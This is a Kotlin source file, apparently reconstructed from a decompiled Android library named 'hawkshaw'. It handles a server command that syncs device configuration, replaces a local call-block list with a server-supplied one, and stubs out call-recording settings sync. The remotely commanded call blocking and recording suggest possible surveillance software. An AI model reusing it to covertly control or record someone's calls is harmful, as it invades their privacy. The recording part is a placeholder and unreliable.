package com.hawkshaw.library.handler

import android.util.Log
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.telephony.CallBlockEntity
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.Serializable

/**
 * Utility functions for synchronizing app configuration
 */
private const val TAG = "SyncAppConfig"

/**
 * Defines the types of app configuration that can be synchronized
 */
@Serializable
enum class SyncType {
    All,
    CallBlocking,
    CallRecording,
    DynamicConfig
}

/**
 * Handle sync app config command
 * @param command Command to handle
 * @param scope Coroutine scope
 * @return Result of the operation
 */
suspend fun handleSyncAppConfig(command: Command, scope: CoroutineScope): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] handleSyncAppConfig called. Command: $command, Current thread: ${Thread.currentThread().name}")
    try {
        // Get device ID from preferences or settings
        val deviceId = Prefs.getString("device_id", "")
        Log.d(TAG, "[DEBUG] handleSyncAppConfig: Device ID: $deviceId")

        // Existing Logger.d call
        Logger.d(TAG, "Syncing app config for device: $deviceId", false, 4, null)
        Log.d(TAG, "[DEBUG] handleSyncAppConfig: Calling Injector.INSTANCE.appConfig.getDynamicConfig() with deviceId: $deviceId")

        // Get dynamic config with device ID
        val response = Injector.INSTANCE.appConfig.getDynamicConfig(deviceId)
        Logger.d(TAG, "Sync app config response: ${response.state}", false, 4, null)
        Log.d(TAG, "[DEBUG] handleSyncAppConfig: getDynamicConfig response details: $response")
        response
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] handleSyncAppConfig: Error syncing app config. Message: ${e.message}", e)
        Logger.e(TAG, "Error syncing app config", e, false, 12, null)
    }
}

/**
 * Check if a specific sync type is requested
 */
private suspend fun sync(syncRequest: Command.SyncAppConfigRequest, syncType: SyncType): Boolean = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] sync called. SyncRequest: $syncRequest, SyncType: $syncType")

    // Handle sync based on type
    when (syncType) {
        SyncType.DynamicConfig -> {
            syncDynamicConfig()
            true
        }
        SyncType.CallBlocking -> {
            syncCallBlocking()
            true
        }
        SyncType.CallRecording -> {
            syncCallRecording()
            true
        }
        SyncType.All -> {
            // Sync all configurations
            syncDynamicConfig()
            syncCallBlocking()
            syncCallRecording()
            true
        }
    }.also { result ->
        Log.d(TAG, "[DEBUG] sync: Completed sync for $syncType. Result: $result")
    }
}

/**
 * Synchronize call blocking configuration
 */
suspend fun syncCallBlocking(): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] syncCallBlocking called. Current thread: ${Thread.currentThread().name}")
    val appConfig = Injector.INSTANCE.appConfig
    Log.d(TAG, "[DEBUG] syncCallBlocking: Calling appConfig.getCallBlockList()")
    val response = appConfig.getCallBlockList()
    Log.d(TAG, "[DEBUG] syncCallBlocking: getCallBlockList response state: ${response.state}, details: $response")

    if (response is ApiResponse.Success) {
        Log.d(TAG, "[DEBUG] syncCallBlocking: Response is Success. Proceeding with database operations.")
        val telephonyDao = AppDatabaseKt.db.telephonyDao()

        // Clear existing data
        Log.d(TAG, "[DEBUG] syncCallBlocking: Calling telephonyDao.nukeCallBlockNumbers()")
        telephonyDao.nukeCallBlockNumbers()
        Log.d(TAG, "[DEBUG] syncCallBlocking: nukeCallBlockNumbers completed.")

        // Convert and save new data
        Log.d(TAG, "[DEBUG] syncCallBlocking: Attempting to parse call block list from response.")
        val blockList = try {
            // Try to extract list from the response using reflection
            val responseObj = response.result
            Log.d(TAG, "[DEBUG] syncCallBlocking: Parsing responseObj: $responseObj")
            val listField = responseObj::class.java.getDeclaredField("list")
            listField.isAccessible = true
            val blockListRaw = listField.get(responseObj) as? List<*>
            Log.d(TAG, "[DEBUG] syncCallBlocking: Extracted raw block list size: ${blockListRaw?.size}")

            // Map the list items to CallBlockEntity objects
            blockListRaw?.mapNotNull { item ->
                if (item == null) {
                    Log.w(TAG, "[DEBUG] syncCallBlocking: Found null item in raw block list, skipping.")
                    return@mapNotNull null
                }
                Log.d(TAG, "[DEBUG] syncCallBlocking: Mapping item: $item")
                try {
                    val nameField = item::class.java.getDeclaredField("name")
                    val numberField = item::class.java.getDeclaredField("number")
                    val blockOutgoingField = item::class.java.getDeclaredField("blockOutgoingCall")

                    nameField.isAccessible = true
                    numberField.isAccessible = true
                    blockOutgoingField.isAccessible = true

                    val name = nameField.get(item) as String
                    val number = numberField.get(item) as String
                    val blockOutgoing = blockOutgoingField.get(item) as Boolean
                    Log.d(TAG, "[DEBUG] syncCallBlocking: Parsed item - Name: $name, Number: $number, BlockOutgoing: $blockOutgoing")
                    CallBlockEntity(
                        name = name,
                        number = number,
                        blockOutgoing = blockOutgoing
                    )
                } catch (mappingEx: Exception) {
                    Log.e(TAG, "[DEBUG] syncCallBlocking: Error mapping item: $item. Message: ${mappingEx.message}", mappingEx)
                    null // Skip this item if there's an error mapping its fields
                }
            } ?: emptyList<CallBlockEntity>().also {
                 Log.d(TAG, "[DEBUG] syncCallBlocking: Raw block list was null, resulting in empty CallBlockEntity list.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] syncCallBlocking: Error parsing call block list from response. Message: ${e.message}", e)
            Logger.e(
                TAG,
                "Error parsing call block list: ${e.message}",
                b = false,
                i = 12,
                nothing = null
            )
            emptyList()
        }
        Log.d(TAG, "[DEBUG] syncCallBlocking: Parsed blockList size: ${blockList.size}")

        Log.d(TAG, "[DEBUG] syncCallBlocking: Calling telephonyDao.saveCallBlockNumbers() with ${blockList.size} items.")
        telephonyDao.saveCallBlockNumbers(blockList)
        Log.d(TAG, "[DEBUG] syncCallBlocking: saveCallBlockNumbers completed.")

        // Existing Logger.d call
        Logger.d(TAG, "SyncCallBlocking: synced", false, 4, null)
        Log.d(TAG, "[DEBUG] syncCallBlocking: Sync completed successfully.")
    } else {
        Log.w(TAG, "[DEBUG] syncCallBlocking: Response was not Success. State: ${response.state}")
    }

    Unit
}

/**
 * Synchronize call recording configuration
 */
suspend fun syncCallRecording(): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] syncCallRecording called. Current thread: ${Thread.currentThread().name}")
    // Similar implementation to syncCallBlocking, handling call recording settings
    Logger.d(TAG, "SyncCallRecording: synced", false, 4, null)
    Log.d(TAG, "[DEBUG] syncCallRecording: Sync logic (placeholder) completed.")
    Unit
}

/**
 * Synchronize dynamic configuration
 */
suspend fun syncDynamicConfig() {
    try {
        // Get device ID from preferences or settings
        val deviceId = Prefs.getString("device_id", "")
        Logger.d(TAG, "Syncing dynamic config for device: $deviceId", false, 4, null)

        // Fetch dynamic config from the server
        val response = Injector.INSTANCE.appConfig.getDynamicConfig(deviceId)

        when (response) {
            is ApiResponse.Success -> {
                val config = response.result.toString()
                // Save the configuration to preferences
                Prefs.putString("dynamic_config", config)
                Logger.d(TAG, "Successfully synced dynamic config", false, 4, null)
            }
            is ApiResponse.Error -> {
                Logger.e(TAG, "Failed to sync dynamic config: ${response.message}", null, false, 8, null)
            }
        }
    } catch (e: Exception) {
        Logger.e(TAG, "Error syncing dynamic config", e, false, 8, null)
    }
}
